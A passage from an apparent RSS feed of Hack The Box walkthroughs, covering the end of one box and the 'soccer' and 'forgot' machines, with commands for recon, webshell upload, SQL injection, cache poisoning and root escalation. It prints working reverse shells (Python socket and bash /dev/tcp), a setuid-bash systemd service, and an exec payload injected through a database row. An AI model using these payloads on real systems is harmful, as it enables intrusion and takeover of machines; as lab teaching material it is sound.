ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i encode_key svc@haxtables.htb<br />
We get the user.txt:<br />
<img src="/_resources/8b417af5240c483dbac5faa1fd48aa39.png" /><br />
935c582e0723a6b24e8f663f115737f4</p>
<p>We run sudo -l and see this user has permission to restart any services:<br />
<img src="/_resources/02c5323673a54a59a0da1330bd7b7121.png" /></p>
<p>Since we don't see any unusual services running, we can see if we have write access to the /etc/systemd folder</p>
<p><img src="/_resources/de5346d7ea2f4d6fa2668fa24aa7172d.png" /></p>
<p>It's not certain, but can try to create our own service that spawn a root shell, and restart it:<br />
We can follow the template here:<br />
<a title="https://www.shubhamdipt.com/blog/how-to-create-a-systemd-service-in-linux/" href="https://www.shubhamdipt.com/blog/how-to-create-a-systemd-service-in-linux/">https://www.shubhamdipt.com/blog/how-to-create-a-systemd-service-in-linux/</a></p>
<p>echo '[Unit]<br />
Description=pwn the box<br />
[Service]<br />
Type=dothething<br />
ExecStart=chmod u+s /bin/bash<br />
[Install]<br />
WantedBy=multi-user.target' &gt; /etc/systemd/system/pwn.service</p>
<p>We verify that the /bin/bash has the setuid:<br />
<img src="/_resources/2c7bdaf94eed4dd4851f2ee0049f1f82.png" /></p>
<p>Now we run bash -p and get a root shell to read the root.txt:<br />
<img src="/_resources/7d71bf1965374c029589e1665496035f.png" /><br />
84ef1ff228f83caf8a52ad2819ccd1c3</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[HTB soccer]]></title>
            <guid>ed425196585240789bf0f19c4670322a</guid>
            <pubDate>Fri, 03 Mar 2023 03:12:39 GMT</pubDate>
            <content:encoded><![CDATA[<p>We start with nmap:<br />
nmap -sV -sC -oA nmap/intial 10.10.11.194</p>
<p><img src="/_resources/f5c0a3f5c4a34a45b25fbb00934974a1.png" /></p>
<p>The nmap scan tells us the name of the page is soccer.htb so we change the /etc/hosts file</p>
<p>We run a full scan while we go explore the page, but find no additional ports.</p>
<p>We do a banner grab on port 9091 with a GET request:<br />
<img src="/_resources/7e02089f74d34e979d84dd7dff7ef642.png" /></p>
<p>The server on port 80 is running nginx 1.18.0<br />
<img src="/_resources/c1b6c4c899e245e3a18fea7d63272cd5.png" /></p>
<p>The page loads:<br />
<img src="/_resources/c895ffc9363343068c4172ad713777bd.png" />!</p>
<p>We find a /tiny subdirectory using feroxbuster:<br />
<img src="/_resources/44cebe31e0914bcbaf7ea604ce046b01.png" /></p>
<p>There we have a login portal:<br />
<img src="/_resources/b0176b5c96b44472ab3a54d4eb73648f.png" /></p>
<p>We can see this is tinyfilemanager version 2.4.3<br />
<img src="/_resources/1d4c5e2c27064c47b91c3298f9bd8896.png" /></p>
<p>A quick search tells us we can expoit this service:<br />
<a title="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit" href="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit">https://github.com/febinrev/tinyfilemanager-2.4.3-exploit</a></p>
<p>Using the admin creds in the example exploit admin:admin@123 we are able to autheniticate, which means this is a vulnerable version.<br />
<img src="/_resources/8458caeafe85467697734079697b73ba.png" /><br />
<img src="/_resources/1d2543be7cd0464eae04843062aeaaed.png" /></p>
<p>We can upload our own webshell manually:<br />
<img src="/_resources/13acead1696f4069a464d807f874522b.png" /></p>
<p>We navigate to the uploads folder on the site and find our shell.<br />
<a title="http://soccer.htb/tiny/uploads/foil.php?cmd=id" href="http://soccer.htb/tiny/uploads/foil.php?cmd=id">http://soccer.htb/tiny/uploads/foil.php?cmd=id</a><br />
<img src="/_resources/2e8e3dc5eba24e588078138ba90901ac.png" /></p>
<p>Our webshell disappears rather quickly so we need to try using a php reverse shell file rather than a webshell.</p>
<p>We get a reverse shell:<br />
<img src="/_resources/ad8206a47c724153b42b034783964d70.png" /><br />
We see that there is a user, player:<br />
<img src="/_resources/07e5df22a044466097cf652d465fc6dd.png" /><br />
uname -a tells us:<br />
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</p>
<p>We read the tinyfilemanager.php file and see only two users:<br />
<img src="/_resources/71a50e8af8114ad6827d0ce58e33dcd2.png" /></p>
<p>We see a subdomain in /etc/nginx/sites-enabled:<br />
<img src="/_resources/ddc34c07d76a4ce7a4adf3d8c84e47de.png" /><br />
We read that the site is running on port 3000<br />
<img src="/_resources/36fd0e7b1a1c4e18bad29073d1a5f48c.png" /></p>
<p>The site is only running on the localhost, so we can try using chisel to run it on our machine:<br />
We start chisel on our machine:<br />
./chisel64 server -p 8001 --reverse<br />
On the target we use:<br />
./chisel64 client 10.10.14.10:8001 R:socks</p>
<p>The site loads once we use our socks5 proxy through FoxyProxy:<br />
<img src="/_resources/635dfb7790ba4439b43d26fe0e2a1d73.png" /></p>
<p>We create an account:<br />
<img src="/_resources/581503543a874eb1b2847578feedba33.png" /></p>
<p>We look at the source code and see that the site is running a websocket:<br />
<img src="/_resources/87bdf3138b7e4b25b84860c6d6910565.png" /></p>
<p>We can use the script here to direct requests back to our machine:<br />
<a title="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html" href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html</a><br />
We modify the script to change the socket to the socket we found in the source code:<br />
<img src="/_resources/b18073985a624dfd8522403c01df9af8.png" /></p>
<p>We run the script and then run sqlmap:<br />
sqlmap -u "<a title="http://localhost:8081/?id=1" href="http://localhost:8081/?id=1">http://localhost:8081/?id=1</a>" -p "id"</p>
<p>The id paramater is injectable, so we dump the database:<br />
<img src="/_resources/6d0c6eea7d424669965bd471a8fe66a9.png" /></p>
<p>We get credentials:<br />
<img src="/_resources/3f844a5231f94a699401450041e980c8.png" /></p>
<p>We can try to use these on ssh:<br />
player:PlayerOftheMatch2022</p>
<p>ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" player@soccer.htb</p>
<p>They work and we get the user.txt:<br />
<img src="/_resources/178908e3c7784aedad3cbeac7a71664e.png" /><br />
5a1c2b1cfc34b0860c365e9780ad7624</p>
<p>We run the command to check for suid binaries and find an unusual binary:<br />
find / -perm -u=s -type f 2&gt;/dev/null<br />
<img src="/_resources/b751c839c7b24ca98f56deaca3954080.png" /></p>
<p>We read the configuration file for doas and find an interesting entry.<br />
cat /usr/local/etc/doas.conf<br />
<img src="/_resources/b559ae47f6c4423bbc75d267218e06c5.png" /></p>
<p>According to this reference, if we are allowed to run as sudo, we can execute a python file as root.<br />
<a title="https://gtfobins.github.io/gtfobins/dstat/" href="https://gtfobins.github.io/gtfobins/dstat/">https://gtfobins.github.io/gtfobins/dstat/</a></p>
<p>We can create a reverse shell python script and execute is using the following command:</p>
<p>doas -u root /usr/bin/dstat --filename</p>
<p>we make a reverse shell called dstat_banana.py in the /usr/local/share/dstat folder</p>
<p>import socket,subprocess,os;<br />
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br />
s.connect(("10.10.14.10”,1337));</p>
<p>os.dup2(s.fileno(),0);<br />
os.dup2(s.fileno(),1);<br />
os.dup2(s.fileno(),2);</p>
<p>import pty; pty.spawn(“/bin/bash”)</p>
<p><img src="/_resources/7121f55167ac4a3eb432e21ec485e86c.png" /></p>
<p>Then we run:<br />
doas -u root /usr/bin/dstat --banana</p>
<p><img src="/_resources/db11a269c5654b32a3078c2a899a67af.png" /></p>
<p>We get our root shell and grab the root.txt:</p>
<p><img src="/_resources/147786b8413842cc8df999951305e14f.png" /></p>
<p>9da0fd47bd42fcdbed86727e7586973e</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[HTB forgot]]></title>
            <guid>5cde7c764b7e40b097e95f28f14c8fda</guid>
            <pubDate>Thu, 02 Mar 2023 03:51:09 GMT</pubDate>
            <content:encoded><![CDATA[<p>We start with an nmap scan:<br />
nmap -sV -sC -oA nmap/intial 10.10.11.188<br />
<img src="/_resources/082cadf136094aa9bb681ec28f56b69d.png" /></p>
<p>We add the machine to our /etc/hosts file and then visit the site on port 80:</p>
<p><img src="/_resources/e86926068ca24f8a9665988eff03e9d7.png" /></p>
<p>We have a login screen with many cookies:</p>
<p><img src="/_resources/1813a948472d4ef5b6e3769a160397b1.png" /></p>
<p>There is also something strange in the requests the nmap scan output:<br />
Via: 1.1 varnish (Varnish/6.2)</p>
<p>We run nikto and wait to see what it pulls before attempting to run gobuster or feroxbuster.<br />
Nikto gave nothing, and we try feroxbuster:<br />
<img src="/_resources/ec746a33e9c04d54bfaac0abe49cfd5c.png" /></p>
<p>Meanwhile, we can play with the login form.</p>
<p>We try the forgot password function and enter admin. We get an error:<br />
<img src="/_resources/84732728bf7243488b6f8052887cf7a5.png" /></p>
<p>The reset page loads, but whatever we input gives us an invalid token error.</p>
<p>Looking at the source code, we find a username:<br />
<img src="/_resources/26d4289ec0c641e9bd3699403628d220.png" /></p>
<p>robert-dev-14329<br />
Someone made a python script for this box, but the hint we needed was that the username that works to get the token is robert-dev-36712<br />
<img src="/_resources/76f6e39dee044fb89550cd829f2249b6.png" /></p>
<p>We can experiment with this tomorrow.</p>
<p>We login with the creds we created:<br />
<img src="/_resources/075237878ce8473ba9fd27ca357ae00a.png" /></p>
<p>We see a page called tickets with usernames:<br />
<img src="/_resources/01c3ec3c15104a8e8d562475cab6b909.png" /></p>
<p>We see another form:<br />
<img src="/_resources/11c1616d8cf6459d90b9bac98cb002a1.png" /></p>
<p>We learn from the post request that this is using a Jenkins service:<br />
<img src="/_resources/f7c991f4108c4fe883980fc6c621d696.png" /></p>
<p>We submit the form with our ip address and see what happens:<br />
<img src="/_resources/cbbcd5a2f28547938284c75e9775588f.png" /></p>
<p>We look at the source code and see a hidden disabled page called admin_tickets:<br />
<img src="/_resources/ed57fb19b3af445da05a2212184d9625.png" /></p>
<p>We try a cache poisoning attack. We will use curl commands to grab the cookies.</p>
<p>curl -X "GET" -H "Host: 10.10.14.10:9980" <br />
<a title="http://10.10.11.188/forgot?username=robert-dev-14329" href="http://10.10.11.188/forgot?username=robert-dev-14329">http://10.10.11.188/forgot?username=robert-dev-14329</a></p>
<p>curl -s -o /dev/null -v -d "username=robert-dev-14329&amp;password=qwerty" <br />
-X POST <a title="http://10.10.11.188/login" href="http://10.10.11.188/login">http://10.10.11.188/login</a></p>
<p>We are able to grab a session cookie after logging in:<br />
<img src="/_resources/a710eea59c814b339c0e9754fa34ec4d.png" /></p>
<p>curl -i -d "to=Admin&amp;link=http://10.10.11.188/static/blahblah.png" <br />
-H "Cookie: session=42252835-2fd8-45bc-b355-148b28556d20;"    <br />
-X POST <a title="http://10.10.11.188/escalate" href="http://10.10.11.188/escalate">http://10.10.11.188/escalate</a></p>
<p>We then send a request for an escalation using the server's ip address and wait to see if there is a post:<br />
<img src="/_resources/1003617a38914971a49e34465f6febf2.png" /></p>
<p>curl -I <a title="http://10.10.11.188/static/blahblah.png" href="http://10.10.11.188/static/blahblah.png">http://10.10.11.188/static/blahblah.png</a><br />
We make a request to see if the cache was poisoned, and see if we get a new admin cookie:</p>
<p><img src="/_resources/11cc1d49283a483d85c9231fdc9e1337.png" /></p>
<p>curl -I -H "cookie: session=46594168-eb3f-4248-a197-7143b13714ed" <a title="http://10.10.11.188/admin_tickets" href="http://10.10.11.188/admin_tickets">http://10.10.11.188/admin_tickets</a><br />
We make a request to see the admin_tickets page with the new cookie:<br />
<img src="/_resources/5ee319b24b8b463c8903059ea450b123.png" /></p>
<p>Now we use the browser to visit the site with the stolen admin cookie:<br />
<img src="/_resources/b4e03511d5df4de9a27658afe1db4b2f.png" /><br />
Looks like we have ssh credentials:<br />
diego:dCb#1!x0%gjq</p>
<p>We are able to login to ssh using:<br />
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" diego@10.10.11.188<br />
<img src="/_resources/fa83ca9c6e1e480c9b1451fb0b86d152.png" /></p>
<p>We run uname and find that the machine is running:<br />
Linux forgot 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</p>
<p>We start looking at the box, and notice that there are some internal ports:<br />
<img src="/_resources/0e73f7b6d6e74a77a0760bffca66d425.png" /></p>
<p>We can see that mysql is running on port 3306.<br />
We can try the same credentials we used to ssh into the machine.<br />
We use mysql -u diego -p<br />
<img src="/_resources/1090790b1fdd448dbe9bf2609b6d22e3.png" /><br />
There was nothing particularly useful there, and that version is not vulnerable to anything we can see.</p>
<p>We run sudo -l and find an interesting file:<br />
<img src="/_resources/dcc8cbbb911d4149b550e07c00e97491.png" /></p>
<p>We found a method that we can try:</p>
<p>First get two ssh sessions.</p>
<p>Create the /dev/shm/kk.sh script. Something like this:</p>
<p>#!/bin/bash<br />
bash -i &gt;&amp; /dev/tcp/10.0.0.1/4443 0&gt;&amp;1</p>
<p>chmod 777 kk.sh<br />
<img src="/_resources/a49001d1d148487c9ce3ad6dffa3a0a4.png" /><br />
Read the database creds from /opt/security/ml_security.py and log in to the database. Run these:</p>
<p>use app;</p>
<p>insert into escalate values ("lol","lol","lol",'hello=exec("""\nimport<br />
os\nos.system("/dev/shm/kk.sh")\nprint("&amp;ErrMsg=%3Cimg%20src=%22http://imgur.com/bTkSe.png%22%20/%3E%3CSCRIPT%3Ealert%28%22xss%22%29%3C/SCRIPT%3E")""")');<br />
<img src="/_resources/ac4d407f2fca48ef9f5ea1a046bc7362.png" /></p>
<p>make listener</p>
<p>nc -nvlp 4443</p>
<p>On the second session just run:</p>
<p>sudo /opt/security/ml_security.py<br />
<img src="/_resources/0b4caf9835dd42d4a65c836539726eae.png" /></p>
<p>We have a root shell and get the root.txt:<br />
<img src="/_resources/a2c3e6df30054c449576d7b2b128a9ba.png" /><br />
8d2b80b768aa54e9491cb8a2da18e6f2</p>
]]></content:encoded>
        </item>
    </channel>
</rss>